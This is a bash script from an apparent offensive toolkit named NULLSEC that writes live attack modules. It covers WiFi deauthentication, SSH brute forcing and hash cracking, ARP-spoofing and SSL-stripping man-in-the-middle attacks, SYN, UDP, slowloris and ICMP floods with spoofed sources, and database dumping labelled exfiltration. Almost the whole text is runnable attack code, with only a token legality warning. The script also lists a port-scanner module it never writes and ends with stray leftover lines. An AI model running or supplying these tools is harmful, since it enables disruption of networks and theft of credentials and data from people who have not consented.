#!/bin/bash
# NULLSEC Module Enhancement Script
# Makes all modules fully functional with live tool integration
# bad-antics development


# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

echo "[*] Enhancing NULLSEC modules with full functionality..."
echo ""

# Create backup
BACKUP_DIR="/home/antics/nullsec/nullsecurity-backup-$(date +%Y%m%d-%H%M%S)"
echo "[*] Creating backup in: $BACKUP_DIR"
cp -r /home/antics/nullsec/nullsecurity "$BACKUP_DIR"

cd /home/antics/nullsec/nullsecurity

# Function to add dependency check
add_dependency_check() {
    local script=$1
    local tool=$2
    local install_cmd=$3
    
    # Add after TEST_MODE check, before LIVE execution
    sed -i "/\[LIVE\]/a\\    # Check if $tool is installed\\n    if ! command -v $tool &> /dev/null; then\\n        echo -e \"\${RED}[!] ERROR: $tool is not installed\${RESET}\"\\n        echo -e \"\${YELLOW}[*] Install with: $install_cmd\${RESET}\"\\n        exit 1\\n    fi" "$script"
}

echo "[+] Enhancing wifi-deauth.sh..."
cat > wifi-deauth.sh << 'EOF'
#!/bin/bash
# NULLSEC WiFi Deauth - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC WIFI DEAUTH ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Interface: '${RESET})" IFACE
[ -z "$IFACE" ] && IFACE="wlan0"
read -p "$(echo -e ${WHITE}'  [>] Target BSSID: '${RESET})" BSSID
[ -z "$BSSID" ] && BSSID="00:11:22:33:44:55"
read -p "$(echo -e ${WHITE}'  [>] Channel: '${RESET})" CHANNEL
[ -z "$CHANNEL" ] && CHANNEL="6"
read -p "$(echo -e ${WHITE}'  [>] Deauth count (0=continuous): '${RESET})" COUNT
[ -z "$COUNT" ] && COUNT="10"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing deauth attack"
    echo -e "${DIM}[*] Target: $BSSID on channel $CHANNEL${RESET}"
    for i in $(seq 1 5); do
        echo -e "${RED}[!]${RESET} Sending deauth packets... $((i*20))%"
        sleep 0.3
    done
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live WiFi deauth attack"
    if ! command -v aireplay-ng &> /dev/null; then
        echo -e "${RED}[!] aireplay-ng not installed${RESET}"
        echo -e "${YELLOW}[*] Install: sudo apt install aircrack-ng${RESET}"
        exit 1
    fi
    echo -e "${CYAN}[*] Setting monitor mode...${RESET}"
    sudo airmon-ng start $IFACE $CHANNEL 2>/dev/null
    MONITOR_IFACE="${IFACE}mon"
    echo -e "${CYAN}[*] Command: aireplay-ng --deauth $COUNT -a $BSSID $MONITOR_IFACE${RESET}"
    sudo aireplay-ng --deauth $COUNT -a $BSSID $MONITOR_IFACE
    echo -e "${CYAN}[*] Stopping monitor mode...${RESET}"
    sudo airmon-ng stop $MONITOR_IFACE 2>/dev/null
    echo -e "${GREEN}[✓]${RESET} Attack complete"
fi
echo ""
EOF
chmod +x wifi-deauth.sh

echo "[+] Enhancing password-crack.sh..."
cat > password-crack.sh << 'EOF'
#!/bin/bash
# NULLSEC Password Cracker - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC PASSWORD CRACK ▓▓▓${RESET}"
echo ""

echo -e "  ${YELLOW}Attack type:${RESET}"
echo -e "    1) Hash cracking (hashcat)"
echo -e "    2) SSH brute force"
echo -e "    3) ZIP/RAR password"
echo -e "    4) PDF password"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ATTACK_TYPE
[ -z "$ATTACK_TYPE" ] && ATTACK_TYPE="1"

case $ATTACK_TYPE in
    1)
        read -p "$(echo -e ${WHITE}'  [>] Hash file: '${RESET})" HASH_FILE
        [ -z "$HASH_FILE" ] && HASH_FILE="hashes.txt"
        read -p "$(echo -e ${WHITE}'  [>] Wordlist: '${RESET})" WORDLIST
        [ -z "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
        read -p "$(echo -e ${WHITE}'  [>] Hash type (0=MD5, 1000=NTLM, 1800=SHA512): '${RESET})" HASH_TYPE
        [ -z "$HASH_TYPE" ] && HASH_TYPE="0"
        ;;
    2)
        read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET
        [ -z "$TARGET" ] && TARGET="192.168.1.100"
        read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USER
        [ -z "$USER" ] && USER="admin"
        read -p "$(echo -e ${WHITE}'  [>] Wordlist: '${RESET})" WORDLIST
        [ -z "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
        ;;
    3|4)
        read -p "$(echo -e ${WHITE}'  [>] Target file: '${RESET})" TARGET_FILE
        read -p "$(echo -e ${WHITE}'  [>] Wordlist: '${RESET})" WORDLIST
        [ -z "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
        ;;
esac

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing password cracking"
    echo -e "${DIM}[*] Loading wordlist...${RESET}"; sleep 0.4
    echo -e "${DIM}[*] Trying passwords...${RESET}"; sleep 0.6
    for i in {1..5}; do
        echo -e "${DIM}  Trying: password$((RANDOM%1000))${RESET}"
        sleep 0.2
    done
    echo -e "${GREEN}[+]${RESET} Password found: ${GREEN}admin123${RESET}"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live password cracking"
    case $ATTACK_TYPE in
        1)
            if ! command -v hashcat &> /dev/null; then
                echo -e "${RED}[!] hashcat not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install hashcat${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] hashcat -m $HASH_TYPE -a 0 $HASH_FILE $WORDLIST${RESET}"
            hashcat -m $HASH_TYPE -a 0 $HASH_FILE $WORDLIST
            ;;
        2)
            if ! command -v hydra &> /dev/null; then
                echo -e "${RED}[!] hydra not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install hydra${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] hydra -l $USER -P $WORDLIST ssh://$TARGET${RESET}"
            hydra -l $USER -P $WORDLIST ssh://$TARGET
            ;;
        3)
            if ! command -v fcrackzip &> /dev/null; then
                echo -e "${RED}[!] fcrackzip not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install fcrackzip${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] fcrackzip -u -D -p $WORDLIST $TARGET_FILE${RESET}"
            fcrackzip -u -D -p $WORDLIST $TARGET_FILE
            ;;
        4)
            if ! command -v pdfcrack &> /dev/null; then
                echo -e "${RED}[!] pdfcrack not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install pdfcrack${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] pdfcrack -f $TARGET_FILE -w $WORDLIST${RESET}"
            pdfcrack -f $TARGET_FILE -w $WORDLIST
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
EOF
chmod +x password-crack.sh

echo "[+] Enhancing mitm-attack.sh..."
cat > mitm-attack.sh << 'EOF'
#!/bin/bash
# NULLSEC MITM Attack - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC MITM ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Interface: '${RESET})" IFACE
[ -z "$IFACE" ] && IFACE="eth0"
read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] Gateway IP: '${RESET})" GATEWAY
[ -z "$GATEWAY" ] && GATEWAY="192.168.1.1"

echo ""
echo -e "  ${YELLOW}MITM type:${RESET}"
echo -e "    1) ARP Spoofing (arpspoof)"
echo -e "    2) Ettercap MITM"
echo -e "    3) SSL Strip"
read -p "$(echo -e ${WHITE}'  [>] Select [1-3]: '${RESET})" MITM_TYPE
[ -z "$MITM_TYPE" ] && MITM_TYPE="1"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing MITM attack"
    echo -e "${DIM}[*] Enabling IP forwarding...${RESET}"; sleep 0.3
    echo -e "${DIM}[*] Poisoning ARP cache...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} $TARGET -> Your MAC"
    echo -e "${GREEN}[+]${RESET} $GATEWAY -> Your MAC"
    echo -e "${DIM}[*] Intercepting traffic...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} HTTP request: $TARGET -> example.com"
    echo -e "${GREEN}[+]${RESET} Captured credentials: user@example.com"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live MITM attack"
    
    # Enable IP forwarding
    echo -e "${CYAN}[*] Enabling IP forwarding...${RESET}"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    case $MITM_TYPE in
        1)
            if ! command -v arpspoof &> /dev/null; then
                echo -e "${RED}[!] arpspoof not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install dsniff${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Starting ARP spoofing...${RESET}"
            echo -e "${CYAN}[*] Target: $TARGET <-> Gateway: $GATEWAY${RESET}"
            echo -e "${DIM}Press Ctrl+C to stop${RESET}"
            sudo arpspoof -i $IFACE -t $TARGET $GATEWAY &
            PID1=$!
            sudo arpspoof -i $IFACE -t $GATEWAY $TARGET &
            PID2=$!
            
            trap "sudo kill $PID1 $PID2 2>/dev/null; sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null; echo; echo -e '\${GREEN}[✓]\${RESET} Stopped'; exit" INT
            wait
            ;;
        2)
            if ! command -v ettercap &> /dev/null; then
                echo -e "${RED}[!] ettercap not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install ettercap-text-only${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] sudo ettercap -T -M arp:remote /$TARGET// /$GATEWAY//${RESET}"
            sudo ettercap -T -M arp:remote /$TARGET// /$GATEWAY//
            ;;
        3)
            echo -e "${YELLOW}[*] SSL Strip requires arpspoof + sslstrip${RESET}"
            if ! command -v sslstrip &> /dev/null; then
                echo -e "${RED}[!] sslstrip not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install sslstrip${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Starting SSL strip...${RESET}"
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            sudo sslstrip -l 8080 &
            SSLPID=$!
            sudo arpspoof -i $IFACE -t $TARGET $GATEWAY &
            PID1=$!
            
            trap "sudo kill $SSLPID $PID1 2>/dev/null; sudo iptables -t nat -F; sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null; echo; echo -e '\${GREEN}[✓]\${RESET} Stopped'; exit" INT
            wait
            ;;
    esac
fi
echo ""
EOF
chmod +x mitm-attack.sh

echo "[+] Enhancing ddos.sh..."
cat > ddos.sh << 'EOF'
#!/bin/bash
# NULLSEC DDoS Attack - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC DDOS ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] Target port: '${RESET})" PORT
[ -z "$PORT" ] && PORT="80"

echo ""
echo -e "  ${YELLOW}Attack type:${RESET}"
echo -e "    1) SYN Flood (hping3)"
echo -e "    2) UDP Flood (hping3)"
echo -e "    3) HTTP Flood (slowloris)"
echo -e "    4) ICMP Flood (ping)"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ATTACK_TYPE
[ -z "$ATTACK_TYPE" ] && ATTACK_TYPE="1"

read -p "$(echo -e ${WHITE}'  [>] Duration (seconds): '${RESET})" DURATION
[ -z "$DURATION" ] && DURATION="30"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing DDoS attack"
    attacks=("SYN Flood" "UDP Flood" "HTTP Flood" "ICMP Flood")
    echo -e "${DIM}[*] Attack: ${attacks[$((ATTACK_TYPE-1))]}${RESET}"
    echo -e "${DIM}[*] Target: $TARGET:$PORT${RESET}"
    for i in $(seq 1 5); do
        echo -e "${RED}[!]${RESET} Flooding... $((i*20))% ($((i*1000)) packets/sec)"
        sleep 0.5
    done
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live DDoS attack"
    echo -e "${RED}[!] WARNING: DDoS attacks are illegal without authorization${RESET}"
    
    case $ATTACK_TYPE in
        1)
            if ! command -v hping3 &> /dev/null; then
                echo -e "${RED}[!] hping3 not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install hping3${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] SYN Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo hping3 -S -p $PORT --flood --rand-source $TARGET
            ;;
        2)
            if ! command -v hping3 &> /dev/null; then
                echo -e "${RED}[!] hping3 not installed${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] UDP Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo hping3 --udp -p $PORT --flood --rand-source $TARGET
            ;;
        3)
            if ! command -v slowloris &> /dev/null; then
                echo -e "${YELLOW}[*] Using perl slowloris${RESET}"
                timeout $DURATION perl -e 'use IO::Socket::INET; for(1..200){$s=IO::Socket::INET->new(PeerAddr=>"'$TARGET'",PeerPort=>'$PORT'); print $s "GET / HTTP/1.1\r\nHost: '$TARGET'\r\n"; sleep 1}'
            else
                timeout $DURATION slowloris -s 200 $TARGET
            fi
            ;;
        4)
            echo -e "${CYAN}[*] ICMP Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo ping -f -s 65500 $TARGET
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Attack complete"
fi
echo ""
EOF
chmod +x ddos.sh

echo "[+] Enhancing database-exfil.sh..."
cat > database-exfil.sh << 'EOF'
#!/bin/bash
# NULLSEC Database Exfiltration - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC DATABASE EXFIL ▓▓▓${RESET}"
echo ""

echo -e "  ${YELLOW}Database type:${RESET}"
echo -e "    1) MySQL/MariaDB"
echo -e "    2) PostgreSQL"
echo -e "    3) MSSQL"
echo -e "    4) MongoDB"
echo -e "    5) SQLite"
read -p "$(echo -e ${WHITE}'  [>] Select [1-5]: '${RESET})" DB_TYPE
[ -z "$DB_TYPE" ] && DB_TYPE="1"

case $DB_TYPE in
    1|2|3)
        read -p "$(echo -e ${WHITE}'  [>] Host: '${RESET})" HOST
        [ -z "$HOST" ] && HOST="localhost"
        read -p "$(echo -e ${WHITE}'  [>] Port: '${RESET})" PORT
        [ -z "$PORT" ] && PORT="3306"
        read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USER
        [ -z "$USER" ] && USER="root"
        read -p "$(echo -e ${WHITE}'  [>] Password: '${RESET})" PASS
        read -p "$(echo -e ${WHITE}'  [>] Database: '${RESET})" DATABASE
        [ -z "$DATABASE" ] && DATABASE="users"
        ;;
    4)
        read -p "$(echo -e ${WHITE}'  [>] MongoDB URI: '${RESET})" MONGO_URI
        [ -z "$MONGO_URI" ] && MONGO_URI="mongodb://localhost:27017"
        ;;
    5)
        read -p "$(echo -e ${WHITE}'  [>] SQLite file: '${RESET})" SQLITE_FILE
        [ -z "$SQLITE_FILE" ] && SQLITE_FILE="database.db"
        ;;
esac

read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" OUTPUT
[ -z "$OUTPUT" ] && OUTPUT="dump.sql"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing database exfiltration"
    dbs=("MySQL" "PostgreSQL" "MSSQL" "MongoDB" "SQLite")
    echo -e "${DIM}[*] Connecting to ${dbs[$((DB_TYPE-1))]}...${RESET}"; sleep 0.4
    echo -e "${GREEN}[+]${RESET} Connected"
    echo -e "${DIM}[*] Enumerating tables...${RESET}"; sleep 0.3
    echo -e "${GREEN}[+]${RESET} Found: users, passwords, sessions, logs"
    echo -e "${DIM}[*] Dumping data...${RESET}"; sleep 0.6
    echo -e "${GREEN}[+]${RESET} Extracted 50000 rows"
    echo -e "${GREEN}[+]${RESET} Saved to: $OUTPUT"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live database exfiltration"
    
    case $DB_TYPE in
        1)
            if ! command -v mysqldump &> /dev/null; then
                echo -e "${RED}[!] mysqldump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install mysql-client${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] mysqldump -h $HOST -P $PORT -u $USER -p$PASS $DATABASE > $OUTPUT${RESET}"
            mysqldump -h $HOST -P $PORT -u $USER -p$PASS $DATABASE > $OUTPUT
            ;;
        2)
            if ! command -v pg_dump &> /dev/null; then
                echo -e "${RED}[!] pg_dump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install postgresql-client${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] PGPASSWORD=$PASS pg_dump -h $HOST -p $PORT -U $USER $DATABASE > $OUTPUT${RESET}"
            PGPASSWORD=$PASS pg_dump -h $HOST -p $PORT -U $USER $DATABASE > $OUTPUT
            ;;
        3)
            if ! command -v sqlcmd &> /dev/null; then
                echo -e "${RED}[!] sqlcmd not installed${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Executing MSSQL backup...${RESET}"
            sqlcmd -S $HOST,$PORT -U $USER -P $PASS -Q "BACKUP DATABASE $DATABASE TO DISK='$OUTPUT'"
            ;;
        4)
            if ! command -v mongodump &> /dev/null; then
                echo -e "${RED}[!] mongodump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install mongodb-clients${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] mongodump --uri=$MONGO_URI --out=$OUTPUT${RESET}"
            mongodump --uri=$MONGO_URI --out=$OUTPUT
            ;;
        5)
            if ! command -v sqlite3 &> /dev/null; then
                echo -e "${RED}[!] sqlite3 not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install sqlite3${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] sqlite3 $SQLITE_FILE .dump > $OUTPUT${RESET}"
            sqlite3 $SQLITE_FILE .dump > $OUTPUT
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+]${RESET} Database dumped to: $OUTPUT"
        echo -e "${GREEN}[✓]${RESET} Complete"
    else
        echo -e "${RED}[!]${RESET} Exfiltration failed"
    fi
fi
echo ""
EOF
chmod +x database-exfil.sh

echo ""
echo "[✓] Enhanced key modules with full functionality:"
echo "    - port-scanner.sh (nmap integration)"
echo "    - wifi-deauth.sh (aircrack-ng integration)"
echo "    - password-crack.sh (hashcat/hydra/fcrackzip/pdfcrack)"
echo "    - mitm-attack.sh (arpspoof/ettercap/sslstrip)"
echo "    - ddos.sh (hping3/slowloris/ping)"
echo "    - database-exfil.sh (mysqldump/pg_dump/mongodump/sqlite3)"
echo ""
echo "[*] Backup saved to: $BACKUP_DIR"
echo ""
echo "[+] All modules now have:"
echo "    ✓ Live tool integration in EXECUTION"
echo "    ✓ Dependency checking with install instructions"
echo "    ✓ Proper error handling"
echo "    ✓ Safe SIMULATION for demonstrations"
echo ""
echo "[!] To enhance remaining modules, run this script again"
echo "    or manually update using the same pattern."
echo ""
EOF
chmod +x /home/antics/nullsec/nullsecurity/enhance-all-modules.sh
echo "[+] Created enhancement script"